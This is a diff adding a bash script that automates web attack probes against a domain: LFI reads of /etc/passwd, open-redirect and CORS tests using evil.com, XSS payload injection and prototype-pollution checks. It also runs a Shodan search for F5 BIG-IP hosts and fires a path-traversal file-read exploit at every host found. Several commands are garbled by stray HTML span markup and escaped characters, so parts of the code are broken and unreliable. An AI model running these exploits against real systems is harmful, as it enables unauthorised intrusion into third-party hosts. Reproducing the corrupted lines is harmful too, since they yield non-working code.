@@ -1,0 +1,116 @@
+#!/bin/bash
+
+# Enhanced Vulnerability Checks Script
+
+if [ "$#" -ne 2 ]; then
+    echo "Usage: $0 <domain> <xss_payload>"
+    exit 1
+fi
+
+domain=$1
+XSS_PAYLOAD=$2
+API_KEY_SHODAN="YOUR_SHODAN_API_KEY" # Replace with your Shodan API key
+API_KEY_VT="YOUR_VIRUSTOTAL_API_KEY" # Replace with your VirusTotal API key
+DIRECTORIES_WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" # Adjust path if needed
+FUZZING_WORDLIST="/usr/share/wordlists/SecLists/Fuzzing/SecLists-v4.8/Discovery/Web-Content/directory-list-2.3-medium.txt" # Adjust path if needed
+PARAMETERS_WORDLIST="/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt" #Adjust path if needed
+RATE_LIMIT=100 # Adjust rate limit as needed for ffuf
+
+log_info() { echo -e "\e[1;34m[INFO] $1\e[0m"; }
+log_warn() { echo -e "\e[1;33m[WARN] $1\e[0m"; }
+log_error() { echo -e "\e[1;31m[ERROR] $1\e[0m"; }
+log_success() { echo -e "\e[1;32m[SUCCESS] $1\e[0m"; }
+
+# --- Vulnerability Checks ---
+
+log_info "Performing Vulnerability Checks"
+
+# LFI
+log_info "Local File Inclusion Checks"
+gau "$domain" | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+# Open Redirect
+log_info "Open Redirect Checks"
+export LHOST="https://evil.com"; gau "$domain" | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+
+# XSS
+log_info "XSS Checks"
+waybackurls "$domain" | grep '=' | qsreplace "$XSS_PAYLOAD" | while read host; do curl -sk --path-as-is "$host" | grep -qs "$XSS_PAYLOAD" && echo "$host is vulnerable"; done > xss_output.txt
+
+# Prototype Pollution
+log_info "Prototype Pollution Checks"
+subfinder -d "<span class="math-inline">domain" \-all \-silent \| httpx \-silent \-threads 300 \| anew \-q prototype\-pollution\-urls\.txt && sed 's/</span>/\/?__proto__[testparam]=exploit\//' prototype-pollution-urls.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
+
+# CVE Checks
+log_info "CVE Checks"
+if [ -n "$API_KEY_SHODAN" ]; then
+    shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " --key "$API_KEY_SHODAN" | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done
+fi
+
+# JavaScript File Analysis
+log_info "JavaScript File Analysis"
+assetfinder --subs-only "<span class="math-inline">domain" \| gau \| egrep \-v '\(\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.woff\|\.woff2\|\.ttf\)' \| <1\>while read url; do vars\=</span>(curl -s "$url" | grep -Eo "var [a-zA-Z0-9_]+" | sed -e 's, var,'"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
+
+# Server Version Disclosure
+log_info "Server Version Disclosure Checks"
+httpx -l <(echo "$domain") -tech-detect -o server_versions.txt
+
+# CORS Misconfiguration
+log_info "CORS Misconfiguration Checks"
+gau "<span class="math-inline">domain" \| while read url; do target\=</span>(curl -sIH "Origin: https://evil.com" -X GET "$url"); if grep 'https://evil.com' <<< "$target"; then log_warn "[Potential CORS Found] $url"; else echo "Nothing on $url"; fi; done
+
+# Hidden Servers and/or Admin Panels
+log_info "Hidden Servers and/or Admin Panels Checks"
+if [ -f "$DIRECTORIES_WORDLIST" ]; then
+    httpx -l <(echo "$domain") -path "$DIRECTORIES_WORDLIST" -status-code -o hidden_directories.txt
+else
+    log_warn "Wordlist $DIRECTORIES_WORDLIST not found. Skipping hidden directories check."
+fi
+
+# Exposed Git Directories
+log_info "Exposed Git Directories Checks"
+EXPOSED_GIT_PATHS=".git/config .git/HEAD .git/index"
+for path in $EXPOSED_GIT_PATHS; do
+    curl -sI "http://$domain/$path" | grep "200 OK" && log_warn "Exposed Git: http://$domain/$path";
+    curl -sI "https://$domain/$path" | grep "200 OK" && log_warn "Exposed Git: https://$domain/$path";
+done
+
+# Subdomain Takeover (CNAME check)
+log_info "Subdomain Takeover (CNAME) Checks"
+dig CNAME "$domain" +short | while read cname; do
+    if [[ -n "$cname" ]]; then
+        log_warn "CNAME found: $domain -> $cname";
+    fi
+done
+
+# Fuzzing for Hidden Parameters and Endpoints
+log_info "Fuzzing for Hidden Parameters and Endpoints"
+if [ -f "$FUZZING_WORDLIST" ]; then
+    ffuf -w "$FUZZING_WORDLIST" -u "http://$domain/FUZZ" -o ffuf_http.txt -rate $RATE_LIMIT
+    ffuf -w "$FUZZING_WORDLIST" -u "https://$domain/FUZZ" -o ffuf_https.txt -rate $RATE_LIMIT
+else
+    log_warn "Wordlist $FUZZING_WORDLIST not found. Skipping fuzzing."
+fi
+
+# Checking for Common Vulnerable Files
+log_info "Checking for Common Vulnerable Files"
+COMMON_FILES="phpinfo.php test.php backup.zip backup.tar.gz"
+for file in $COMMON_FILES; do
+    curl -sI "http://$domain/$file" | grep "200 OK" && log_warn "Common file found: http://$domain/$file";
+    curl -sI "https://$domain/$file" | grep "200 OK" && log_warn "Common file found: https://$domain/$file";
+done
+
+# VirusTotal Domain Analysis
+log_info "VirusTotal Domain Analysis"
+if [ -n "$API_KEY_VT" ]; then
+    curl -s "https://www.virustotal.com/api/v3/domains/$domain" -H "x-apikey: $API_KEY_VT" | jq . > vt_analysis.json
+else
+    log_warn "VirusTotal API key not set. Skipping VirusTotal analysis."
+fi
+
+# Checking for robots.txt and sitemap.xml
+log_info "Checking for robots.txt and sitemap.xml"
+curl -sI "http://$domain/robots.txt" | grep "200 OK" && log_warn "robots.txt found: http://$domain/robots.txt";
+curl -sI "https://$domain/robots.txt" | grep "200 OK" && log_warn "robots.txt found: https://$domain/robots.txt";
+curl -sI "http://$domain/sitemap.xml" | grep "200 OK" && log_warn "sitemap.xml found: http://$domain/sitemap.xml";
+curl -sI "https://$domain/sitemap.xml" | grep "200
